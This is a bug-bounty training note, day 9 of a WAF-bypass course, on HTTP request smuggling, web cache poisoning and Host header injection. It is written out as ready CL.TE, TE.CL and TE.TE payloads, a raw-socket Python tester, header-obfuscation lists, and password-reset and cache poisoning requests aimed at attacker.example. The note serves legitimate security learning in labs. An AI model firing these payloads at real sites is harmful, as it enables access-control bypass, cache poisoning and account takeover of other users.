# 🚨 Day 09 — HTTP Request Smuggling, Cache Poisoning & Desync Attacks

> **Part of:** 15-Day WAF Bypass & Payload Crafting Mastery  
> **Date:** _Add your date_  
> **Difficulty:** ⭐⭐⭐⭐⭐ Elite  
> **Time Required:** 7–8 hours  
> **Bounty Potential:** $10K–$50K+  
> **Focus:** Request Smuggling, Cache Poisoning, Host Header Injection & Desync Chains  

![Day](https://img.shields.io/badge/Day-09%2F15-blue)
![Status](https://img.shields.io/badge/Status-Elite%20Tier-darkred)
![Focus](https://img.shields.io/badge/Focus-Request%20Smuggling-critical)
![Bounty](https://img.shields.io/badge/Bounty-%2410K--%2450K%2B-gold)

> ⚠️ **Ethical Use Only:**  
> Ei note shudhu legal lab, PortSwigger Academy, YesWeHack Dojo, private lab, authorized bug bounty, or approved pentest scope er jonno. Request smuggling testing intrusive hote pare, tai unauthorized target e test kora jabe na.

---

## 📑 Table of Contents

- [🚨 Why This Is Elite Territory](#-why-this-is-elite-territory)
- [🔁 Micro-Habits to Practice Daily](#-micro-habits-to-practice-daily)
- [🎯 Objectives](#-objectives)
- [⏰ Time Breakdown](#-time-breakdown)
- [⚙️ Session 1: HTTP Message Framing Deep Dive](#️-session-1-http-message-framing-deep-dive)
- [🔥 Session 2: CL.TE Attack Byte-by-Byte](#-session-2-clte-attack-byte-by-byte)
- [🌊 Session 3: TE.CL, TE.TE & Obfuscation Tricks](#-session-3-tecl-tete--obfuscation-tricks)
- [🔗 Session 4: HTTP/2 Smuggling](#-session-4-http2-smuggling)
- [💾 Session 5: Web Cache Poisoning Chains](#-session-5-web-cache-poisoning-chains)
- [🎯 Session 6: Host Header Injection](#-session-6-host-header-injection)
- [📖 Session 7: Real Bug Bounty Writeups Breakdown](#-session-7-real-bug-bounty-writeups-breakdown)
- [🧪 Session 8: Live Hunting Lab](#-session-8-live-hunting-lab)
- [🏆 Day 9 Challenge](#-day-9-challenge)
- [📋 Master Cheat Sheets](#-master-cheat-sheets)
- [📚 Resources](#-resources)
- [❓ Self-Check Questions](#-self-check-questions)
- [🚀 What’s Next](#-whats-next)
- [📝 My Day 9 Notes](#-my-day-9-notes)

---

# 🚨 Why This Is Elite Territory

```text
┌──────────────────────────────────────────────────────────┐
│ WHY REQUEST SMUGGLING = ELITE SKILL                      │
├──────────────────────────────────────────────────────────┤
│ 1. Only a small percentage of hunters truly understand it │
│ 2. Most developers do not know it exists                  │
│ 3. WAFs cannot detect what they do not parse              │
│ 4. It compounds with XSS, SSRF, cache, auth, and routing  │
│ 5. Impact can become High or Critical                     │
│ 6. James Kettle popularized much of modern desync research│
└──────────────────────────────────────────────────────────┘
```

## Chain Mental Model

```text
Request Smuggling
    ↓
WAF Bypass
    ↓
Cache Poisoning / Session Hijacking / Auth Bypass
    ↓
Persistent XSS / Data Leak / Account Takeover
    ↓
High-impact security report
```

---

# 🔁 Micro-Habits to Practice Daily

> **Elite hunters are forged through consistency, not only marathon sessions.**

Ei micro-habits gulo prottek din practice koro.  
Only **35 minutes/day** diye long-term hunter intuition build kora possible.

---

## 🌅 Morning — 15 Minutes

### Habit 1: Writeup of the Day — 5 min

- Open HackerOne Hacktivity or Pentester Land
- Read one writeup
- Focus only on:
  - Payload
  - Root cause
  - Impact
- Add interesting technique to your vault

---

### Habit 2: X Feed Scan — 5 min

- Open your private “BB Hunters” list
- Scroll for 5 minutes maximum
- Save only one useful payload or idea
- Avoid saving everything

---

### Habit 3: Payload Variation — 5 min

- Pick yesterday’s payload
- Write 3 mutations:
  - Different encoding
  - Different context
  - Different header or method
- Test only in your lab
- Document result

---

## ☀️ Afternoon — 10 Minutes

### Habit 4: HTTP Header Inspection — 5 min

- Visit any site for learning
- Open Burp HTTP History
- Inspect headers:
  - CDN
  - WAF
  - Framework
  - Cache behavior
- Ask: “If this were my authorized target, where would I test?”

---

### Habit 5: Parameter Miner Routine — 5 min

- Pick one legal bug bounty endpoint
- Use Param Miner or Arjun
- Document one interesting parameter
- Build hidden attack surface instinct

---

## 🌙 Evening — 15 Minutes

### Habit 6: PortSwigger Lab — 10 min

- Complete one PortSwigger Academy lab
- Track progress in your repo
- Add notes for difficult concepts

---

### Habit 7: Terminal Journal — 5 min

Create:

```text
~/hunter-journal.md
```

Write:

```markdown
# Hunter Journal

## Today I Learned

-

## Payload / Technique

-

## Result

-

## Tomorrow I Will Explore

-
```

---

## 📅 Weekly Habits

### Writeup Sunday — 1 Hour

- Pick one high-impact writeup
- Recreate the concept in a safe lab
- Write your own breakdown

---

### Tool Deep-Dive Saturday — 1 Hour

- Pick one tool
- Read its documentation
- Use it for 30 minutes
- Add notes to your toolkit

---

## 🎯 The Compound Effect

```text
Daily: 35 minutes × 365 days = 213 hours/year

Result:
- 200+ writeups read
- 365+ payloads crafted
- 365+ labs completed
- Strong personal knowledge base
```

---

## Daily Habits Tracker

Add this to:

```text
habits.md
```

```markdown
# Daily Habits Tracker

| Date | Writeup | X Gem | Variation | HTTP Insp. | Params | Lab | Journal |
|---|---|---|---|---|---|---|---|
| 2026-04-28 | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
```

---

# 🎯 Objectives

By the end of Day 9, I will be able to:

- [ ] Explain how HTTP request smuggling works byte-by-byte
- [ ] Identify parser discrepancies between front-end and backend
- [ ] Understand CL.TE, TE.CL, and TE.TE desync patterns
- [ ] Understand HTTP/2 to HTTP/1.1 downgrade risks
- [ ] Explain web cache poisoning chains
- [ ] Understand Host header injection chains
- [ ] Analyze real request smuggling writeups
- [ ] Use Burp HTTP Request Smuggler in legal labs
- [ ] Write professional-level notes and reports

---

# ⏰ Time Breakdown

| Session | Topic | Duration |
|---|---|---:|
| 1 | HTTP Message Framing Deep Dive | 60 min |
| 2 | CL.TE Attack Byte-by-Byte | 90 min |
| 3 | TE.CL, TE.TE & Obfuscation | 75 min |
| 4 | HTTP/2 Smuggling | 75 min |
| 5 | Web Cache Poisoning Chains | 75 min |
| 6 | Host Header Injection | 60 min |
| 7 | Real Writeups Breakdown | 90 min |
| 8 | Live Hunting Lab | 90 min |
| **Total** |  | **~8 hours** |

---

# ⚙️ Session 1: HTTP Message Framing Deep Dive

## The Golden Question

> When an HTTP request has both `Content-Length` and `Transfer-Encoding: chunked`, which one defines the request boundary?

This question is the foundation of HTTP Request Smuggling.

---

## Method 1: Content-Length — The Byte Counter

```http
POST /api/user HTTP/1.1
Host: target.com
Content-Length: 13

hello world!!
```

The server reads exactly **13 bytes** from the request body.

---

## Method 2: Transfer-Encoding Chunked — The Chunk Reader

```http
POST /api/user HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

d
hello world!!
0
```

Parsing:

```text
d = hex for 13
hello world!! = 13 bytes
0 = zero-length chunk
0 chunk means body ends
```

---

## The Conflict

When both headers are present, standards say `Transfer-Encoding` should take precedence over `Content-Length`.

But real systems do not always behave consistently.

| Component | Possible Behavior |
|---|---|
| Nginx | Usually follows TE |
| Apache | Usually follows TE |
| IIS | May vary by config/version |
| Cloudflare | Edge/origin behavior can differ |
| AWS ALB | May differ from backend behavior |
| Akamai | Context-dependent |
| Tomcat | Behavior depends on version/config |
| Node.js | Behavior depends on parser/version |

---

## The Desync Opportunity

```text
[Attacker]
    ↓
Sends request with both CL and TE
    ↓
[Front-end]
    ↓
Uses one interpretation
    ↓
[Backend]
    ↓
Uses a different interpretation
    ↓
Extra bytes become a new backend request
```

The backend may process a request the front-end never understood as separate.

---

## Why Keep-Alive Matters

```text
[Front-end] ←── TCP connection ──→ [Backend]
                 ↑
        Multiple HTTP requests
        can reuse this socket
```

If front-end and backend disagree on where request 1 ends, the backend may treat remaining bytes as request 2.

---

## Request Smuggling Prerequisites

| Requirement | Why It Matters |
|---|---|
| Different front-end and backend parsers | Creates parsing mismatch |
| HTTP/1.1 keep-alive | Allows requests on same connection |
| Conflicting framing behavior | Creates desync |
| Backend request reuse | Enables queued/smuggled request behavior |

---

# 🔥 Session 2: CL.TE Attack Byte-by-Byte

## CL.TE Meaning

```text
CL.TE = Front-end uses Content-Length
        Backend uses Transfer-Encoding
```

---

## Example Stack

```text
[Attacker]
    ↓
[Nginx / CDN / Proxy Front-end]  → uses Content-Length
    ↓
[Backend App Server]             → uses Transfer-Encoding
```

---

## CL.TE Payload Anatomy

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 46
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin HTTP/1.1
Host: target.com
```

---

## Body Breakdown

The body starts after the blank line.

```text
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: target.com\r\n
\r\n
```

Approximate byte count:

```text
"0\r\n"                         = 3 bytes
"\r\n"                          = 2 bytes
"GET /admin HTTP/1.1\r\n"       = 21 bytes
"Host: target.com\r\n"          = 18 bytes
"\r\n"                          = 2 bytes

Total = 46 bytes
```

Python helper:

```python
body = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
print(len(body))
```

---

## Front-End Processing

```text
1. Receives request
2. Sees Content-Length: 46
3. Reads 46 bytes of body
4. Forwards request to backend
5. Thinks it forwarded one complete request
```

---

## Backend Processing

```text
1. Receives same request
2. Uses Transfer-Encoding: chunked
3. Reads chunk size: 0
4. Treats request as ended
5. Remaining bytes become a new backend request
```

Remaining bytes:

```http
GET /admin HTTP/1.1
Host: target.com
```

---

## Testing Manually in Burp

### Burp Setup

```text
Burp Repeater
→ Disable automatic Content-Length update
→ Send carefully crafted payload
→ Observe delay, errors, or response confusion
```

### Important Notes

- Send twice if a lab requires connection poisoning
- Watch for timing anomalies
- Watch for unexpected responses
- Only test in labs or authorized targets

---

## Lab-Safe Detection Script Skeleton

Save as:

```text
scripts/smuggle_detect.py
```

```python
#!/usr/bin/env python3
"""
HTTP Request Smuggling lab helper.

Use only against:
- Your own lab
- PortSwigger labs
- Explicitly authorized targets
"""

import socket
import ssl
import sys
import time


def send_raw(host: str, port: int, payload: str, use_ssl: bool = False, timeout: int = 8) -> bytes:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))

    if use_ssl:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)

    sock.sendall(payload.encode())

    response = b""

    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            response += data
    except socket.timeout:
        pass
    finally:
        sock.close()

    return response


def test_cl_te(host: str, port: int = 80, use_ssl: bool = False) -> None:
    print(f"\nTesting CL.TE on {host}:{port}")

    smuggled = f"GET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n"
    body = f"0\r\n\r\n{smuggled}"

    payload = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    )

    start = time.time()
    response = send_raw(host, port, payload, use_ssl)
    elapsed = time.time() - start

    decoded = response.decode("utf-8", errors="ignore")

    print(f"Response time: {elapsed:.2f}s")
    print(decoded[:500])

    if elapsed > 7:
        print("[!] Timeout-like behavior observed.")
    if decoded.count("HTTP/1.1") > 1:
        print("[!] Multiple HTTP responses observed.")
    if "admin" in decoded.lower():
        print("[!] Admin keyword observed in response.")


def main() -> None:
    if len(sys.argv) < 2:
        print("Usage: python3 smuggle_detect.py <host> [port] [https]")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    use_ssl = len(sys.argv) > 3 and sys.argv[3].lower() in {"https", "ssl", "443"}

    test_cl_te(host, port, use_ssl)


if __name__ == "__main__":
    main()
```

Usage:

```bash
python3 scripts/smuggle_detect.py localhost 9090
python3 scripts/smuggle_detect.py example.com 443 https
```

> ⚠️ Use only where you have permission.

---

# 🌊 Session 3: TE.CL, TE.TE & Obfuscation Tricks

## TE.CL Meaning

```text
TE.CL = Front-end uses Transfer-Encoding
        Backend uses Content-Length
```

This is less common but can be highly impactful.

---

## TE.CL Conceptual Payload

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

5c
GPOST / HTTP/1.1
Content-Length: 15

x=1
0
```

---

## TE.CL Breakdown

| Element | Front-end View | Backend View |
|---|---|---|
| Chunk size | Front-end reads chunked body | Backend may ignore |
| Content-Length | May be ignored by front-end | Backend uses CL |
| Remaining bytes | Normal body | Next request candidate |

---

## TE.TE Meaning

```text
TE.TE = Both see Transfer-Encoding
        But disagree because one TE header is obfuscated
```

Example:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: xchunked

0

GET /admin HTTP/1.1
Host: target.com
```

One parser may accept `chunked`, another may reject or ignore it.

---

## TE Obfuscation Gallery

Use only in legal labs.

```http
Transfer-Encoding: chunked 
Transfer-Encoding:chunked
Transfer-Encoding : chunked
Transfer-Encoding:	chunked
TRANSFER-ENCODING: chunked
tRaNsFeR-eNcOdInG: chunked
Transfer-Encoding: identity, chunked
Transfer-Encoding: chunked, x
Transfer-Encoding: chunked, identity
Transfer-Encoding: xchunked
```

---

## CL.CL Duplicate Content-Length

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 8
Content-Length: 7

12345678x
```

If front-end and backend choose different `Content-Length` headers, even one byte can cause a desync.

---

# 🔗 Session 4: HTTP/2 Smuggling

## HTTP/2 Fundamentals

HTTP/2 is binary and frame-based, unlike text-based HTTP/1.1.

```text
HTTP/2 Frame:
┌────────────────────────────────────┐
│ Length │ Type │ Flags │ Stream ID  │
│ Payload                            │
└────────────────────────────────────┘
```

Common frame types:

```text
HEADERS
DATA
PRIORITY
RST_STREAM
SETTINGS
```

---

## Why HTTP/2 Smuggling Happens

Many stacks use:

```text
[Client] --HTTP/2--> [Front-end/CDN] --HTTP/1.1--> [Backend]
```

The front-end translates HTTP/2 into HTTP/1.1.  
Translation mistakes can cause desync.

---

## H2.CL Concept

```text
HTTP/2 request includes:
content-length: 0

But actual DATA frame contains:
GET /admin HTTP/1.1
Host: target.com
```

If translated badly:

```text
Backend sees:
Content-Length: 0

Then leftover body bytes become another request.
```

---

## H2.TE Concept

```text
HTTP/2 request includes:
transfer-encoding: chunked

Body contains:
0

GET /admin HTTP/1.1
Host: target.com
```

If the HTTP/2 front-end forwards invalid TE behavior into HTTP/1.1, backend desync may occur.

---

## Testing HTTP/2 in Burp

```text
Burp Repeater
→ Right-click request
→ Use HTTP/2
→ Modify headers carefully
→ Observe timing and response anomalies
```

Tool reference:

```bash
git clone https://github.com/defparam/smuggler
cd smuggler
python3 smuggler.py -u https://target.com/
```

---

# 💾 Session 5: Web Cache Poisoning Chains

## Cache Poisoning Basics

A cache key is usually based on:

```text
HTTP method + URL + Host
```

Example:

```text
GET + /home + target.com
```

Same cache key means users may receive the same cached response.

---

## Unkeyed Headers

Headers that influence backend response but are not included in the cache key can be dangerous.

Common examples:

```text
X-Forwarded-Host
X-Forwarded-For
X-Host
X-Original-URL
X-Rewrite-URL
Forwarded
Cookie
Custom X-* headers
```

---

## Classic Cache Poisoning

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.example
```

If backend uses `X-Forwarded-Host` to generate links and cache ignores that header, poisoned content may be cached.

---

## Poisoned Response Example

```html
<link rel="stylesheet" href="https://attacker.example/style.css">
```

Victim requests normal page and receives poisoned cached response.

---

## Cache Poisoning via Request Smuggling

```http
POST /home HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /home?xss=<script>alert(1)</script> HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.example
```

Potential chain:

```text
Smuggled request
    ↓
Backend generates poisoned response
    ↓
Cache stores response
    ↓
Victims receive poisoned content
```

---

## Cache Deception

Cache deception is the inverse problem.

```text
/private/profile
    ↓
/private/profile/x.css
    ↓
Backend returns private data
    ↓
Cache stores it as static content
```

---

## Cache Header Detection

```bash
curl -sI https://target.com/ | grep -iE "cache|age|x-cache|via"
```

Look for:

```text
Cache-Control
Age
X-Cache
CF-Cache-Status
Via
```

---

# 🎯 Session 6: Host Header Injection

## Why Host Header Matters

The `Host` header can influence:

- Virtual host routing
- URL generation
- Password reset links
- Redirects
- CORS checks
- Cache behavior

---

## Password Reset Poisoning Pattern

Vulnerable logic:

```python
reset_link = f"https://{request.host}/reset?token={token}"
```

Attack concept:

```http
POST /forgot-password HTTP/1.1
Host: attacker.example
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

If the app trusts `Host`, the victim may receive a poisoned reset link.

---

## Host Header Bypass Techniques

Use only in legal labs.

```http
Host: target.com
X-Forwarded-Host: attacker.example
```

```http
Host: target.com
X-Host: attacker.example
```

```http
Host: target.com
Forwarded: host=attacker.example
```

```http
GET https://attacker.example/ HTTP/1.1
Host: target.com
```

```http
Host: target.com
Host: attacker.example
```

```http
Host: attacker.example:80
```

```http
Host: target.com@attacker.example
```

---

## Smuggling + Host Header Chain

```http
POST /forgot-password HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /forgot-password HTTP/1.1
Host: attacker.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

email=victim@example.com
```

Potential chain:

```text
WAF sees legitimate Host
    ↓
Backend processes smuggled Host
    ↓
Password reset link points to attacker-controlled host
    ↓
Victim token exposure risk
```

---

## h2cSmuggler Reference

```bash
git clone https://github.com/BishopFox/h2csmuggler
cd h2csmuggler
python3 h2csmuggler.py -x https://target.com/ https://target.com/admin
```

---

# 📖 Session 7: Real Bug Bounty Writeups Breakdown

## Writeup 1: James Kettle — Request Smuggling Research

| Field | Notes |
|---|---|
| Researcher | James Kettle / PortSwigger |
| Topic | HTTP desync attacks |
| Key Idea | Parser differences between front-end and backend |
| Lesson | Scale testing and understand infrastructure behavior |

---

## Writeup 2: Slack CL.TE Disclosure

| Field | Notes |
|---|---|
| Researcher | Evan Custodio |
| Platform | HackerOne |
| Bug Type | CL.TE request smuggling |
| Lesson | Smaller infrastructure subdomains can still matter |

---

## Writeup 3: Cloud Metadata Chain Pattern

```text
Request smuggling
    ↓
SSRF endpoint
    ↓
Cloud metadata exposure
    ↓
Credential or identity exposure risk
```

Lesson:

```text
High impact often comes from chaining multiple medium-risk issues.
```

---

## Writeup 4: Varnish Cache Poisoning Pattern

```text
Smuggled request
    ↓
Poisoned cache response
    ↓
Persistent user impact
```

Lesson:

```text
Cache behavior can turn temporary injection into persistent impact.
```

---

## Writeup 5: Response Queue Poisoning

```text
Desync
    ↓
Backend response queue mismatch
    ↓
Victim receives wrong response
```

Lesson:

```text
Request smuggling impact may affect other users, so testing must be careful.
```

---

## Writeup 6: Browser-Powered Desync

```text
Victim browser sends multiple requests
    ↓
Connection behavior causes desync
    ↓
Subsequent requests are affected
```

Lesson:

```text
Modern desync research is not limited to classic server-side keep-alive behavior.
```

---

## Writeup 7: Cookie Smuggling Pattern

```text
Smuggled request
    ↓
Injected Cookie header
    ↓
Session confusion or fixation risk
```

---

## Writeup 8: Cookie Bomb Pattern

```text
Smuggled request
    ↓
Oversized cookie/header
    ↓
Next request may fail with 431 or similar
```

---

## Writeup 9: HTTP/2 Smuggling on Edge Devices

```text
HTTP/2 pseudo-header or CRLF translation issue
    ↓
HTTP/1.1 backend receives unexpected request
    ↓
Potential auth bypass or RCE depending on target
```

---

## Writeup 10: YesWeHack Dojo CL.TE Challenge

Practice in a controlled environment:

```text
Lab challenge
    ↓
CL.TE desync understanding
    ↓
Manual payload crafting skill
```

---

## Add Writeups to Your Vault

```bash
mkdir -p payload-vault/hunter-chains/smuggling

for i in $(seq 1 10); do
  touch "payload-vault/hunter-chains/smuggling/writeup-$i.md"
done
```

Template:

```markdown
# Writeup Title

## Source

Researcher:  
Link:  
Bug Class:  

## Root Cause

-

## Payload / Concept

-

## Impact

-

## Lessons Learned

-
```

---

# 🧪 Session 8: Live Hunting Lab

## Recommended Lab Sources

- PortSwigger Web Security Academy
- YesWeHack Dojo
- Your own Docker lab
- Authorized bug bounty targets only

---

## Must-Do PortSwigger Labs

- [ ] HTTP request smuggling, basic CL.TE vulnerability
- [ ] HTTP request smuggling, basic TE.CL vulnerability
- [ ] HTTP request smuggling, obfuscating the TE header
- [ ] Exploiting HTTP request smuggling to reveal front-end request rewriting
- [ ] Exploiting HTTP request smuggling to bypass front-end security controls

Resource:

```text
https://portswigger.net/web-security/request-smuggling
```

---

## Custom Lab Docker Skeleton

Create:

```text
docker-compose-smuggle.yml
```

```yaml
version: "3.8"

services:
  frontend:
    image: nginx:1.18-alpine
    ports:
      - "9090:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
    depends_on:
      - backend

  backend:
    image: tomcat:9.0
    expose:
      - "8080"
```

Create:

```text
nginx.conf
```

```nginx
events {}

http {
  upstream backend {
    server backend:8080;
    keepalive 32;
  }

  server {
    listen 80;

    location / {
      proxy_pass http://backend;
      proxy_http_version 1.1;
      proxy_set_header Connection "";
    }
  }
}
```

Run:

```bash
docker compose -f docker-compose-smuggle.yml up -d
```

---

## Hunting Checklist

When testing a legal target:

- [ ] Identify CDN/WAF
- [ ] Check HTTP/1.1 support
- [ ] Check keep-alive behavior
- [ ] Run Burp HTTP Request Smuggler
- [ ] Look for timing anomalies
- [ ] Test CL.TE, TE.CL, TE.TE in scope
- [ ] Try HTTP/2 downgrade only if allowed
- [ ] Check cache headers
- [ ] Test Host header variations
- [ ] Document exact payloads and evidence

---

## Responsible Testing Rules

Request smuggling can affect other users.

Always:

- Test only in scope
- Use unique markers
- Avoid destructive payloads
- Stop if unexpected user impact appears
- Report clearly and responsibly

---

# 🏆 Day 9 Challenge

Mark Day 9 complete after:

- [ ] Complete all 5 PortSwigger smuggling labs
- [ ] Build custom vulnerable Docker stack
- [ ] Smuggle a request manually in Burp lab
- [ ] Run detection helper only on local/authorized targets
- [ ] Install HTTP Request Smuggler extension
- [ ] Install `smuggler.py`
- [ ] Document 3 real writeups in detail
- [ ] Practice 10 TE obfuscation variants
- [ ] Understand HTTP/2 downgrade scenario
- [ ] Perform cache poisoning in local lab
- [ ] Execute Host header injection in local lab
- [ ] Start daily micro-habits tracker
- [ ] Push `Day-09.md` + notes to GitHub

---

# 📋 Master Cheat Sheets

## CL.TE Payload Template

```http
POST / HTTP/1.1
Host: target.com
Content-Length: [CALCULATE]
Transfer-Encoding: chunked
Connection: keep-alive

0

[SMUGGLED REQUEST HERE]
```

---

## TE.CL Payload Template

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

[HEX_SIZE]
[SMUGGLED REQUEST]
0
```

---

## Detection Indicators

| Indicator | Possible Meaning |
|---|---|
| Response delay over several seconds | Backend may be waiting |
| Multiple HTTP responses | Response queue confusion |
| 400 after valid request | Poisoned connection |
| Unexpected internal/admin data | Possible successful desync |
| Cache `Age` changes unexpectedly | Cache manipulation |

---

## Top TE Obfuscations

```http
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding:chunked
Transfer-Encoding:	chunked
Transfer-Encoding: chunked 
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
Transfer-Encoding: chunked, xchunked
TRANSFER-ENCODING: chunked
tRaNsFeR-eNcOdInG: chunked
Transfer_Encoding: chunked
X-Transfer-Encoding: chunked
```

---

## Tools Quick Reference

| Tool | Use Case |
|---|---|
| Burp Repeater | Manual crafting |
| HTTP Request Smuggler | Burp-based detection |
| smuggler.py | Standalone probing |
| curl `--http2` | HTTP/2 testing |
| netcat | Raw TCP testing |
| Custom Python | Controlled lab testing |

---

# 📚 Resources

## Must-Read

- [PortSwigger — HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger Research](https://portswigger.net/research)
- [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)

## Tools

- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [smuggler by defparam](https://github.com/defparam/smuggler)
- [h2csmuggler by BishopFox](https://github.com/BishopFox/h2csmuggler)

## Labs

- [PortSwigger Academy Request Smuggling Labs](https://portswigger.net/web-security/request-smuggling)
- [YesWeHack Dojo](https://dojo-yeswehack.com/)

## Researchers to Follow

- [@albinowax](https://x.com/albinowax)
- [@defparam](https://x.com/defparam)
- [@rabbit_1986](https://x.com/rabbit_1986)
- [@pwnwithlove](https://x.com/pwnwithlove)

---

# ❓ Self-Check Questions

1. Content-Length vs Transfer-Encoding conflict resolution ki?
2. CL.TE desync step-by-step explain korte parbo?
3. HTTP keep-alive er role ki?
4. TE.CL attack keno less common but impactful?
5. HTTP/2 smuggling HTTP/1.1 smuggling theke kivabe different?
6. Cache poisoning + request smuggling chain er impact ki?
7. Host header injection diye password reset poisoning flow ki?
8. Unkeyed headers keno dangerous?
9. 10 ta TE header obfuscation variant bolo.
10. Response queue poisoning e victim impact ki?
11. Browser-powered desync attack concept ki?
12. Real bug bounty te smuggling khujte kon indicators check korbo?

✅ All 12 answered confidently? **Day 9 complete!**

---

# 🚀 What’s Next?

**Day 10 Preview:** Cloud WAF Bypass + Origin IP Discovery

- Cloudflare bypass concepts
- Akamai bypass strategies
- AWS WAF-specific behaviors
- CDN misconfigurations
- Origin exposure review
- Final hunter methodology

---

# 📝 My Day 9 Notes

## PortSwigger Labs Completed

- [ ] Basic CL.TE
- [ ] Basic TE.CL
- [ ] Obfuscating TE header
- [ ] Reveal front-end rewriting
- [ ] Bypass front-end controls CL.TE

---

## Payloads That Worked

| Type | Target | Impact | Notes |
|---|---|---|---|
| CL.TE |  |  |  |
| TE.CL |  |  |  |
| TE.TE |  |  |  |
| H2.CL |  |  |  |

---

## Cache Poisoning Attempts

```text
Successful poisoning on:
Unkeyed header exploited:
Cache behavior:
```

---

## Host Header Findings

```text
Target:
Impact:
Evidence:
```

---

## Favorite Writeup of the Day

```text
Title:
Researcher:
Key takeaway:
```

---

## Micro-Habits Started Today

- [ ] Morning writeup reading
- [ ] X feed scan
- [ ] Payload variation
- [ ] HTTP header inspection
- [ ] Parameter miner routine
- [ ] PortSwigger daily lab
- [ ] Terminal journal

---

## Key Insight Today

```text
Write your key insight here.
```

---

<p align="center">
  <strong>🎓 Day 9 Status:</strong> ⬜ In Progress / ✅ Complete<br>
  <em>“The best hunters understand how infrastructure disagrees with itself.”</em>
</p>

<p align="center">
  <a href="./Day-08.md">← Previous: Day 08</a> |
  <a href="./Day-10.md">Next: Day 10 →</a>
</p>
